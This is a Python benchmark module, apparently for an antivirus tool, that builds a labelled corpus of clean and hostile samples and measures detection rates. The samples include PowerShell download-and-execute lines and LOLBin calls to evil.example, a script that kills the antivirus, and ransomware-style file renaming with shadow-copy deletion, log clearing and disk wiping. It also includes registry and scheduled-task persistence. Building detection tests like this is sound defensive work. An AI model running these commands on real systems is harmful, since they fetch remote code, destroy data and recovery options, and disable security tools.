from __future__ import annotations

import json
import zipfile
from datetime import datetime
from pathlib import Path

from .config import PE_EXTENSIONS, REPORTS_DIR, ensure_app_dirs
from .models import BenchmarkReport
from .staged_analysis import StagePipeline

EICAR_TEST_STRING = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

HARD_CORPUS_TEMPLATES: dict[str, dict[str, str]] = {
    "clean": {
        "readme.txt": "Projet demo sans code executable.",
        "maintenance.ps1": "Write-Output 'Daily maintenance task'; Get-Date",
        "notes.md": "Checklist: backup local, update software, review alerts.",
    },
    "malicious": {
        "encoded_dropper.ps1": "\n".join(
            [
                "$payload='SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBwAHMAMQAnACkA'",
                "powershell.exe -NoP -W Hidden -EncodedCommand $payload",
                "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')",
            ]
        ),
        "living_off_the_land.cmdline": "mshta.exe http://evil.example/a.hta && rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\" && regsvr32 /s /n /u /i:http://evil.example/file.sct scrobj.dll",
        "tamper_ragnar.ps1": "taskkill /F /IM RagnarProtect.exe; schtasks /Delete /TN \"Ragnar Protect Background Protection\" /F; Remove-Item $env:LOCALAPPDATA\\RagnarProtect\\background_worker.json -Force",
    },
    "ransomware": {
        "locker_chain.ps1": "\n".join(
            [
                "$aes = New-Object System.Security.Cryptography.AesManaged",
                "Get-ChildItem $env:USERPROFILE\\Documents -Recurse -File | ForEach-Object {",
                "  if ($_.Extension -in '.docx','.xlsx','.pdf','.txt') {",
                "    Rename-Item $_.FullName ($_.FullName + '.lockbit')",
                "  }",
                "}",
                "Set-Content \"$env:USERPROFILE\\Desktop\\HOW_TO_DECRYPT.txt\" \"your files are encrypted\"",
                "cmd.exe /c vssadmin delete shadows /all /quiet",
                "cmd.exe /c wbadmin delete catalog -quiet",
                "cmd.exe /c bcdedit /set {default} recoveryenabled no",
                "cmd.exe /c wevtutil cl System",
            ]
        ),
        "sabotage_chain.cmdline": "vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet && bcdedit /set {default} bootstatuspolicy ignoreallfailures && cipher /w:C:",
    },
    "advanced": {
        "staged_loader.ps1": "\n".join(
            [
                "$blob = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'",
                "$decoded = [System.Convert]::FromBase64String($blob)",
                "Add-Type -TypeDefinition 'public class X{public static void Run(){}}'",
                "IEX (New-Object Net.WebClient).DownloadString('http://cdn.bad.example/2.ps1')",
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /d powershell.exe /f",
                "schtasks /create /sc onlogon /tn updater /tr powershell.exe /f",
            ]
        ),
        "anti_recovery_combo.cmdline": "diskshadow /s c:\\temp\\script.txt && wevtutil cl Security && bcdedit /set {default} recoveryenabled no && reagentc /disable",
    },
}


class BenchmarkRunner:
    def __init__(self, scanner, database) -> None:
        self.scanner = scanner
        self.database = database
        self.pipeline = StagePipeline(scanner, database)

    def build_hard_corpus(self, output_dir: str | Path | None = None) -> dict[str, object]:
        ensure_app_dirs()
        if output_dir is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            corpus_root = REPORTS_DIR / f"hard_corpus_{timestamp}"
        else:
            corpus_root = Path(output_dir).expanduser().resolve()
        corpus_root.mkdir(parents=True, exist_ok=True)

        bucket_counts: dict[str, int] = {}
        created = 0
        for bucket, templates in HARD_CORPUS_TEMPLATES.items():
            bucket_dir = corpus_root / bucket
            bucket_dir.mkdir(parents=True, exist_ok=True)
            for relative_path, content in templates.items():
                destination = bucket_dir / relative_path
                destination.parent.mkdir(parents=True, exist_ok=True)
                destination.write_text(content, encoding="utf-8")
                created += 1
            bucket_counts[bucket] = len(templates)

        eicar_path = corpus_root / "malicious" / "eicar.com.txt"
        eicar_path.write_text(EICAR_TEST_STRING, encoding="ascii")
        created += 1
        bucket_counts["malicious"] = bucket_counts.get("malicious", 0) + 1

        nested_archive_path = corpus_root / "advanced" / "nested_dropper.zip"
        with zipfile.ZipFile(nested_archive_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(
                "payload/loader.ps1",
                HARD_CORPUS_TEMPLATES["malicious"]["encoded_dropper.ps1"],
            )
            archive.writestr(
                "payload/how_to_decrypt.txt",
                "HOW_TO_DECRYPT - your files are encrypted",
            )
        created += 1
        bucket_counts["advanced"] = bucket_counts.get("advanced", 0) + 1

        ransomware_archive = corpus_root / "ransomware" / "double_stage.zip"
        with zipfile.ZipFile(ransomware_archive, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("stage1/readme_decrypt.txt", "restore files by paying")
            archive.writestr("stage1/sabotage.cmd", HARD_CORPUS_TEMPLATES["ransomware"]["sabotage_chain.cmdline"])
        created += 1
        bucket_counts["ransomware"] = bucket_counts.get("ransomware", 0) + 1

        return {
            "corpus_path": str(corpus_root),
            "generated_samples": created,
            "bucket_counts": bucket_counts,
        }

    def run_hard_suite(self, output_dir: str | Path | None = None) -> BenchmarkReport:
        corpus_meta = self.build_hard_corpus(output_dir)
        return self.run(corpus_meta["corpus_path"], profile="hard")

    def run(self, corpus_dir: str | Path, profile: str = "standard") -> BenchmarkReport:
        ensure_app_dirs()
        corpus = Path(corpus_dir).expanduser().resolve()
        bucket_names = ("clean", "malicious", "ransomware", "advanced")
        buckets = {name: list((corpus / name).rglob("*")) if (corpus / name).exists() else [] for name in bucket_names}
        initial_counts = {
            label: len([item for item in items if item.is_file()])
            for label, items in buckets.items()
        }
        results: list[dict[str, object]] = []
        clean_false_positives = 0
        detected_bad = 0
        total_bad = 0
        blocked_bad = 0
        total_bad_launchable = 0
        ransomware_interrupted = 0
        advanced_detected = 0
        total_advanced = initial_counts.get("advanced", 0)
        bad_labels = {"malicious", "ransomware", "advanced"}

        for label, items in buckets.items():
            for path in items:
                if not path.is_file():
                    continue
                if path.suffix.lower() in PE_EXTENSIONS:
                    decision, result = self.pipeline.analyze_launch(path)
                    action = decision.action
                    final_verdict = decision.final_verdict
                else:
                    result = self.scanner.scan_file(path)
                    action = "n/a"
                    final_verdict = result.status
                results.append(
                    {
                        "label": label,
                        "path": str(path),
                        "status": final_verdict,
                        "score": result.score,
                        "action": action,
                    }
                )
                if label == "clean" and final_verdict != "clean":
                    clean_false_positives += 1
                if label in bad_labels:
                    total_bad += 1
                    if final_verdict != "clean":
                        detected_bad += 1
                    if label == "advanced":
                        advanced_detected += 1
                    if path.suffix.lower() in PE_EXTENSIONS:
                        total_bad_launchable += 1
                        if action == "kill_quarantine":
                            blocked_bad += 1
                    if label == "ransomware" and final_verdict != "clean":
                        ransomware_interrupted += 1

        report = BenchmarkReport(
            corpus_path=str(corpus),
            profile=profile,
            clean_count=initial_counts["clean"],
            malicious_count=initial_counts["malicious"],
            ransomware_count=initial_counts["ransomware"],
            advanced_count=initial_counts.get("advanced", 0),
            detection_coverage=(detected_bad / total_bad * 100.0) if total_bad else 0.0,
            advanced_detection_rate=(advanced_detected / total_advanced * 100.0) if total_advanced else 0.0,
            pre_execution_block_rate=(blocked_bad / total_bad_launchable * 100.0) if total_bad_launchable else 0.0,
            ransomware_interruption_rate=(ransomware_interrupted / max(1, initial_counts["ransomware"]) * 100.0),
            false_positive_count=clean_false_positives,
            results=results,
        )
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_profile = profile.strip().lower().replace(" ", "_") or "standard"
        json_path = REPORTS_DIR / f"benchmark_{safe_profile}_{timestamp}.json"
        md_path = REPORTS_DIR / f"benchmark_{safe_profile}_{timestamp}.md"
        json_path.write_text(json.dumps(report.to_dict(), indent=2), encoding="utf-8")
        md_path.write_text(self._to_markdown(report), encoding="utf-8")
        report.report_paths = {"json": str(json_path), "markdown": str(md_path)}
        self.database.record_benchmark_run(str(corpus), report.to_dict(), report.observed_at)
        return report

    def _to_markdown(self, report: BenchmarkReport) -> str:
        lines = [
            "# Ragnar Protect Benchmark",
            "",
            f"- Profile: `{report.profile}`",
            f"- Corpus: `{report.corpus_path}`",
            f"- Detection coverage: `{report.detection_coverage:.2f}%`",
            f"- Advanced detection rate: `{report.advanced_detection_rate:.2f}%`",
            f"- Pre-execution block rate: `{report.pre_execution_block_rate:.2f}%`",
            f"- Ransomware interruption rate: `{report.ransomware_interruption_rate:.2f}%`",
            f"- False positives: `{report.false_positive_count}`",
            "",
            "## Results",
        ]
        for item in report.results[:80]:
            lines.append(f"- `{item['label']}` | `{item['status']}` | `{item['action']}` | `{item['path']}`")
        return "\n".join(lines)
